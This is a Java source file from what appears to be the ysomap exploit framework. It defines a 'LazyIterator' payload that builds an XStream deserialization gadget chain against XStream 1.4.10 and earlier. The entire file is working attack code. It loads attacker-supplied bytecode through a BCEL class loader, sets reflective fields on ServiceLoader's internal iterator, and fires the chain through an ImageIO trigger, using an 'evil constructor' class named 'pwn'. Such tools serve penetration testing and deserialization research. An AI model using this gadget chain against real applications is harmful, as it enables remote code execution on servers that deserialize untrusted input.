package ysomap.payloads.xstream;

import ysomap.bullets.Bullet;
import ysomap.bullets.objects.ClassWithEvilConstructor;
import ysomap.common.annotation.*;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.util.Random;

/**
 * @author wh1t3P1g
 * @since 2020/4/17
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.10"})
@Require(bullets = {"ClassWithEvilConstructor","ClassWithEvilStaticBlock"}, param = false)
public class LazyIterator extends XStreamPayload<Object> {

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        Bullet bullet =  new ClassWithEvilConstructor();
        bullet.set("type","class");
        bullet.set("body",args[0]);
        bullet.set("classname","pwn"+new Random().nextLong());
        return bullet;
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof byte[];
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String bcel = PayloadHelper.makeBCELStr((byte[]) obj);
        Object classLoader = PayloadHelper.makeBCELClassLoader();
        Object serviceLoader = ReflectionHelper.createWithoutConstructor("java.util.ServiceLoader");
        Object it = ReflectionHelper.createWithoutConstructor("java.util.ServiceLoader$LazyIterator");
        ReflectionHelper.setFieldValue(it, "nextName", bcel);
        ReflectionHelper.setFieldValue(it, "service", Object.class);
        ReflectionHelper.setFieldValue(it, "loader", classLoader);
        ReflectionHelper.setFieldValue(it, "this$0", serviceLoader);
        return ImageIO.makeIteratorTriggerNative(it);
    }
}
